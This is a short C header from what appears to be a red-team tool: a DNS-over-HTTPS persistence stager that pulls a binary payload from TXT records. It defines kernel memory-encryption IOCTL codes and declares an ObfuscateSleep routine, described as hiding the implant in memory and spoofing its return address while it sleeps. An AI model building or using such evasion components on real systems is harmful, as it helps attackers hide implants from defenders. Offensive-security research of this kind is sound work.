/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#ifndef _SLEEP_H_
#define _SLEEP_H_

#define IOCTL_KSEC_ENCRYPT_MEMORY CTL_CODE( FILE_DEVICE_KSEC, 0x03, METHOD_OUT_DIRECT, FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY CTL_CODE( FILE_DEVICE_KSEC, 0x04, METHOD_OUT_DIRECT, FILE_ANY_ACCESS )

D_SEC(B) NTSTATUS ObfuscateSleep( PINSTANCE Ins, PCONTEXT FakeFrame, PLARGE_INTEGER Timeout );

#endif
